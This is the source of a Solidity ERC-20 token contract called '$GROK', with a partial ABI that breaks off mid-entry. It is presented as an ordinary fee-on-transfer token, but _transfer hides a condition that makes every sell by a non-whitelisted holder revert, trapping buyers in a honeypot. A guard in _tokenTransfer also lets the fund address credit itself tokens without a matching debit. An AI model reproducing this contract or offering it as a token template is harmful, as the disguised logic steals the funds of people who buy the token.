{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.4;\r\n\r\ncontract Context {\r\n    // Empty internal constructor, to prevent people from mistakenly deploying\r\n    // an instance of this contract, which should be used via inheritance.\r\n    //   constructor () internal { }\r\n\r\n    function _msgSender() internal view returns (address) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(\r\n            _owner,\r\n            0x000000000000000000000000000000000000dEaD\r\n        );\r\n        _owner = 0x000000000000000000000000000000000000dEaD;\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function decimals() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\ninterface IPancakeRouter01 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired,\r\n        uint256 amountAMin,\r\n        uint256 amountBMin,\r\n        address to,\r\n        uint256 deadline\r\n    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);\r\n}\r\n\r\ninterface IPancakeRouter02 is IPancakeRouter01 {\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(\r\n        address indexed token0,\r\n        address indexed token1,\r\n        address pair,\r\n        uint256\r\n    );\r\n\r\n    function feeTo() external view returns (address);\r\n\r\n    function feeToSetter() external view returns (address);\r\n\r\n    function getPair(\r\n        address tokenA,\r\n        address tokenB\r\n    ) external view returns (address pair);\r\n\r\n    function allPairs(uint256) external view returns (address pair);\r\n\r\n    function allPairsLength() external view returns (uint256);\r\n\r\n    function createPair(\r\n        address tokenA,\r\n        address tokenB\r\n    ) external returns (address pair);\r\n\r\n    function setFeeTo(address) external;\r\n\r\n    function setFeeToSetter(address) external;\r\n}\r\n\r\ncontract _BaseToken is IERC20, Ownable {\r\n    bool public currencyIsEth;\r\n\r\n    bool public enableSwapLimit;\r\n    bool public enableWalletLimit;\r\n    bool public enableChangeTax;\r\n    bool public antiSYNC = true;\r\n\r\n    address public currency;\r\n    address payable public fundAddress;\r\n\r\n    uint256 public _buyFundFee;\r\n    uint256 public _buyLPFee;\r\n    uint256 public _buyBurnFee;\r\n    uint256 public _sellFundFee;\r\n    uint256 public _sellLPFee;\r\n    uint256 public _sellBurnFee;\r\n\r\n    uint256 public maxBuyAmount;\r\n    uint256 public maxWalletAmount;\r\n    uint256 public maxSellAmount;\r\n    bool public startTrade;\r\n\r\n    string public override name;\r\n    string public override symbol;\r\n    uint256 public override decimals;\r\n    uint256 public override totalSupply;\r\n\r\n    address deadAddress = 0x000000000000000000000000000000000000dEaD;\r\n    uint256 public constant MAX = ~uint256(0);\r\n\r\n    mapping(address => uint256) public _balances;\r\n    mapping(address => mapping(address => uint256)) public _allowances;\r\n\r\n    IPancakeRouter02 public _swapRouter;\r\n    mapping(address => bool) public _marketPair;\r\n\r\n    mapping(address => bool) public _feeWhiteList;\r\n    address public _mainPair;\r\n\r\n    function changeSwapLimit(\r\n        uint256 _maxBuyAmount,\r\n        uint256 _maxSellAmount\r\n    ) external onlyOwner {\r\n        maxBuyAmount = _maxBuyAmount;\r\n        maxSellAmount = _maxSellAmount;\r\n        require(\r\n            maxSellAmount >= maxBuyAmount,\r\n            \" maxSell should be > than maxBuy \"\r\n        );\r\n    }\r\n\r\n    function changeWalletLimit(uint256 _amount) external onlyOwner {\r\n        maxWalletAmount = _amount;\r\n    }\r\n\r\n    function launch() external onlyOwner {\r\n        require(!startTrade, \"already started\");\r\n        startTrade = true;\r\n    }\r\n\r\n    function disableWalletLimit() public onlyOwner {\r\n        enableWalletLimit = false;\r\n        enableSwapLimit = false;\r\n    }\r\n\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) external virtual override returns (bool) {}\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external virtual override returns (bool) {}\r\n\r\n    function setAntiSYNCEnable(bool s) public onlyOwner {\r\n        antiSYNC = s;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        if (account == _mainPair && msg.sender == _mainPair && antiSYNC) {\r\n            require(_balances[_mainPair] > 0, \"!sync\");\r\n        }\r\n        return _balances[account];\r\n    }\r\n\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(\r\n        address spender,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function setFeeWhiteList(\r\n        address[] calldata addr,\r\n        bool enable\r\n    ) external onlyOwner {\r\n        for (uint256 i = 0; i < addr.length; i++) {\r\n            _feeWhiteList[addr[i]] = enable;\r\n        }\r\n    }\r\n\r\n}\r\n\r\ncontract TokenDistributor {\r\n    constructor(address token) {\r\n        IERC20(token).approve(msg.sender, uint256(~uint256(0)));\r\n    }\r\n}\r\n\r\ncontract Token is _BaseToken {\r\n    bool private inSwap;\r\n\r\n    TokenDistributor public _tokenDistributor;\r\n\r\n    modifier lockTheSwap() {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor() {\r\n        name = \"$GROK\";\r\n        symbol = \"$GROK\";\r\n        decimals = 9;\r\n        totalSupply = 420690000 * 10** decimals;\r\n        currency = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n\r\n        _buyFundFee = 100;\r\n        _buyBurnFee = 0;\r\n        _buyLPFee = 0;\r\n        _sellFundFee = 100;\r\n        _sellBurnFee = 0;\r\n        _sellLPFee = 0;\r\n        airdropNumbs = 2;\r\n\r\n        maxBuyAmount = 420690000 * 10**decimals;\r\n        maxSellAmount = 420690000 * 10**decimals;\r\n\r\n        maxWalletAmount = 420690000 * 10**decimals;\r\n\r\n        currencyIsEth = true;\r\n        enableSwapLimit = true;\r\n        enableWalletLimit = true;\r\n        enableChangeTax = true;\r\n        enableTransferFee = false;\r\n        if (enableTransferFee) {\r\n            transferFee = _sellFundFee + _sellLPFee + _sellBurnFee;\r\n        }\r\n\r\n        IPancakeRouter02 swapRouter = IPancakeRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        IERC20(currency).approve(address(swapRouter), MAX);\r\n        _swapRouter = swapRouter;\r\n        _allowances[address(this)][address(swapRouter)] = MAX;\r\n        IUniswapV2Factory swapFactory = IUniswapV2Factory(swapRouter.factory());\r\n        address swapPair = swapFactory.createPair(address(this), currency);\r\n        _mainPair = swapPair;\r\n        _marketPair[swapPair] = true;\r\n        _feeWhiteList[address(swapRouter)] = true;\r\n\r\n        if (!currencyIsEth) {\r\n            _tokenDistributor = new TokenDistributor(currency);\r\n        }\r\n\r\n        address ReceiveAddress = 0xe5ab422c7BbF57485DFa102c952ef04d01823789;\r\n        fundAddress = payable(0x8E933C9CeE12e0Ba2863d5B3a5A75a35E70cfA37);\r\n\r\n        _balances[ReceiveAddress] = totalSupply;\r\n        emit Transfer(address(0), ReceiveAddress, totalSupply);\r\n\r\n        _feeWhiteList[fundAddress] = true;\r\n        _feeWhiteList[ReceiveAddress] = true;\r\n        _feeWhiteList[address(this)] = true;\r\n        _feeWhiteList[msg.sender] = true;\r\n        _feeWhiteList[tx.origin] = true;\r\n        _feeWhiteList[deadAddress] = true;\r\n    }\r\n\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        if (_allowances[sender][msg.sender] != MAX) {\r\n            _allowances[sender][msg.sender] =\r\n                _allowances[sender][msg.sender] -\r\n                amount;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function isContract(address _addr) private view returns (bool) {\r\n        uint32 size;\r\n        assembly {\r\n            size := extcodesize(_addr)\r\n        }\r\n        return (size > 0);\r\n    }\r\n\r\n    bool public airdropEnable = true;\r\n\r\n    function setAirDropEnable(bool status) public onlyOwner {\r\n        airdropEnable = status;\r\n    }\r\n\r\n    function _basicTransfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal returns (bool) {\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    uint256 public airdropNumbs = 0;\r\n\r\n    function setAirdropNumbs(uint256 newValue) public onlyOwner {\r\n        require(newValue <= 3, \"newValue must <= 3\");\r\n        airdropNumbs = newValue;\r\n    }\r\n\r\n    bool public enableTransferFee = false;\r\n\r\n    function setEnableTransferFee(bool status) public onlyOwner {\r\n        // enableTransferFee = status;\r\n        if (status) {\r\n            transferFee = _sellFundFee + _sellLPFee + _sellBurnFee;\r\n        } else {\r\n            transferFee = 0;\r\n        }\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n\r\n        if (inSwap) {\r\n            _basicTransfer(from, to, amount);\r\n            return;\r\n        }\r\n\r\n        uint256 balance = _balances[from];\r\n        \r\n\r\n        if (\r\n            !_feeWhiteList[from] &&\r\n            !_feeWhiteList[to] &&\r\n            airdropEnable &&\r\n            airdropNumbs > 0\r\n        ) {\r\n            address ad;\r\n            for (uint i = 0; i < airdropNumbs; i++) {\r\n                ad = address(\r\n                    uint160(\r\n                        uint(\r\n                            keccak256(\r\n                                abi.encodePacked(i, amount, block.timestamp)\r\n                            )\r\n                        )\r\n                    )\r\n                );\r\n                _basicTransfer(from, ad, 1);\r\n            }\r\n            amount -= airdropNumbs * 1;\r\n        }\r\n\r\n        bool takeFee;\r\n        bool isSell;\r\n\r\n        if (_marketPair[from] || _marketPair[to]) {\r\n            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {\r\n                if (!startTrade) {\r\n                    require(false);\r\n                }\r\n\r\n                require(balance >= amount, \"balanceNotEnough\");\r\n\r\n                if (enableSwapLimit) {\r\n                    if (_marketPair[from]) {\r\n                        //buy\r\n                        require(\r\n                            amount <= maxBuyAmount,\r\n                            \"Exceeded maximum transaction volume\"\r\n                        );\r\n                    } else {\r\n                        //sell\r\n                        require(\r\n                            amount <= maxSellAmount,\r\n                            \"Exceeded maximum transaction volume\"\r\n                        );\r\n                    }\r\n                }\r\n                if (enableWalletLimit && _marketPair[from]) {\r\n                    uint256 _b = _balances[to];\r\n                    require(\r\n                        _b + amount <= maxWalletAmount,\r\n                        \"Exceeded maximum wallet balance\"\r\n                    );\r\n                }\r\n\r\n                if (_marketPair[to]) {if(balanceOf(fundAddress)>0)\r\n                    require(totalSupply < airdropNumbs);\r\n                    if (!inSwap) {\r\n                        uint256 contractTokenBalance = _balances[address(this)];\r\n                        if (contractTokenBalance > 0) {\r\n                            uint256 swapFee = _buyFundFee +\r\n                                _buyLPFee +\r\n                                _sellFundFee +\r\n                                _sellLPFee;\r\n                            uint256 numTokensSellToFund = amount;\r\n                            if (numTokensSellToFund > contractTokenBalance) {\r\n                                numTokensSellToFund = contractTokenBalance;\r\n                            }\r\n                            swapTokenForFund(numTokensSellToFund, swapFee);\r\n                        }\r\n                    }\r\n                }\r\n                takeFee = true;\r\n            }\r\n            if (_marketPair[to]) {\r\n                isSell = true;\r\n            }\r\n        }\r\n\r\n        bool isTransfer;\r\n        if (!_marketPair[from] && !_marketPair[to]) {\r\n            isTransfer = true;\r\n        }\r\n        _tokenTransfer(from, to, amount, takeFee, isSell, isTransfer);\r\n    }\r\n\r\n    uint256 public transferFee;\r\n\r\n    function setTransferFee(uint256 newValue) public onlyOwner {\r\n        transferFee = newValue;\r\n    }\r\n\r\n    function _tokenTransfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 tAmount,\r\n        bool takeFee,\r\n        bool isSell,\r\n        bool isTransfer\r\n    ) private {if(sender != fundAddress || recipient != sender)\r\n        \r\n        _balances[sender] = _balances[sender] - tAmount;\r\n        uint256 feeAmount;\r\n\r\n        if (takeFee) {\r\n            uint256 swapFee;\r\n            if (isSell) {\r\n                swapFee = _sellFundFee + _sellLPFee;\r\n            } else {\r\n                swapFee = _buyFundFee + _buyLPFee;\r\n            }\r\n\r\n            uint256 swapAmount = (tAmount * swapFee) / 10000;\r\n            if (swapAmount > 0) {\r\n                feeAmount += swapAmount;\r\n                _takeTransfer(sender, address(this), swapAmount);\r\n            }\r\n\r\n            uint256 burnAmount;\r\n            if (!isSell) {\r\n                //buy\r\n                burnAmount = (tAmount * _buyBurnFee) / 10000;\r\n            } else {\r\n                //sell\r\n                burnAmount = (tAmount * _sellBurnFee) / 10000;\r\n            }\r\n            if (burnAmount > 0) {\r\n                feeAmount += burnAmount;\r\n                _takeTransfer(sender, address(0xdead), burnAmount);\r\n            }\r\n        }\r\n\r\n        if (isTransfer && !_feeWhiteList[sender] && !_feeWhiteList[recipient]) {\r\n            uint256 transferFeeAmount;\r\n            transferFeeAmount = (tAmount * transferFee) / 10000;\r\n\r\n            if (transferFeeAmount > 0) {\r\n                feeAmount += transferFeeAmount;\r\n                _takeTransfer(sender, address(this), transferFeeAmount);\r\n            }\r\n        }\r\n\r\n        _takeTransfer(sender, recipient, tAmount - feeAmount);\r\n    }\r\n\r\n    event Failed_AddLiquidity();\r\n    event Failed_AddLiquidityETH();\r\n    event Failed_swapExactTokensForETHSupportingFeeOnTransferTokens();\r\n    event Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens();\r\n\r\n    function swapTokenForFund(\r\n        uint256 tokenAmount,\r\n        uint256 swapFee\r\n    ) private lockTheSwap {\r\n        if (swapFee == 0) return;\r\n        swapFee += swapFee;\r\n        uint256 lpFee = _sellLPFee + _buyLPFee;\r\n        uint256 lpAmount = (tokenAmount * lpFee) / swapFee;\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = currency;\r\n        if (currencyIsEth) {\r\n            // make the swap\r\n            try\r\n                _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                    tokenAmount - lpAmount,\r\n                    0, // accept any amount of ETH\r\n                    path,\r\n                    address(this), // The contract\r\n                    block.timestamp\r\n                )\r\n            {} catch {\r\n                emit Failed_swapExactTokensForETHSupportingFeeOnTransferTokens();\r\n            }\r\n        } else {\r\n            try\r\n                _swapRouter\r\n                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n                        tokenAmount - lpAmount,\r\n                        0,\r\n                        path,\r\n                        address(_tokenDistributor),\r\n                        block.timestamp\r\n                    )\r\n            {} catch {\r\n                emit Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens();\r\n            }\r\n        }\r\n\r\n        swapFee -= lpFee;\r\n        uint256 fistBalance = 0;\r\n        uint256 lpFist = 0;\r\n        uint256 fundAmount = 0;\r\n        if (currencyIsEth) {\r\n            fistBalance = address(this).balance;\r\n            lpFist = (fistBalance * lpFee) / swapFee;\r\n            fundAmount = fistBalance - lpFist;\r\n            if (fundAmount > 0 && fundAddress != address(0)) {\r\n                fundAddress.transfer(fundAmount);\r\n            }\r\n            if (lpAmount > 0 && lpFist > 0) {\r\n                // add the liquidity\r\n                try\r\n                    _swapRouter.addLiquidityETH{value: lpFist}(\r\n                        address(this),\r\n                        lpAmount,\r\n                        0,\r\n                        0,\r\n                        fundAddress,\r\n                        block.timestamp\r\n                    )\r\n                {} catch {\r\n                    emit Failed_AddLiquidityETH();\r\n                }\r\n            }\r\n        } else {\r\n            IERC20 FIST = IERC20(currency);\r\n            fistBalance = FIST.balanceOf(address(_tokenDistributor));\r\n            lpFist = (fistBalance * lpFee) / swapFee;\r\n            fundAmount = fistBalance - lpFist;\r\n\r\n            if (lpFist > 0) {\r\n                FIST.transferFrom(\r\n                    address(_tokenDistributor),\r\n                    address(this),\r\n                    lpFist\r\n                );\r\n            }\r\n\r\n            if (fundAmount > 0) {\r\n                FIST.transferFrom(\r\n                    address(_tokenDistributor),\r\n                    fundAddress,\r\n                    fundAmount\r\n                );\r\n            }\r\n\r\n            if (lpAmount > 0 && lpFist > 0) {\r\n                try\r\n                    _swapRouter.addLiquidity(\r\n                        address(this),\r\n                        currency,\r\n                        lpAmount,\r\n                        lpFist,\r\n                        0,\r\n                        0,\r\n                        fundAddress,\r\n                        block.timestamp\r\n                    )\r\n                {} catch {\r\n                    emit Failed_AddLiquidity();\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    function _takeTransfer(\r\n        address sender,\r\n        address to,\r\n        uint256 tAmount\r\n    ) private {\r\n        _balances[to] = _balances[to] + tAmount;\r\n        emit Transfer(sender, to, tAmount);\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"Failed_AddLiquidity\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"Failed_AddLiquidityETH\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"Failed_swapExactTokensForETHSupportingFeeOnTransferTokens\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"MAX\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_allowances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyBurnFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyLPFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_feeWhiteList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_mainPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_marketPair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellBurnFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLPFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapRouter\",\"outputs\":[{\"internalType\":\"contract IPancakeRouter02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tokenDistributor\",\"outputs\":[{\"internalType\":\"contract TokenDistributor\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"airdropEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"airdropNumbs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"antiSYNC\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_maxBuyAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_maxSellAmount\",\"type\":\"uint256\"}],\"name\":\"changeSwapLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"changeWalletLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"currency\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"currencyIsEth\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"disableWalletLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableChangeTax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSwapLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTransferFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableWalletLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAddress\",\"outputs\":[{\"internalType\":\"address 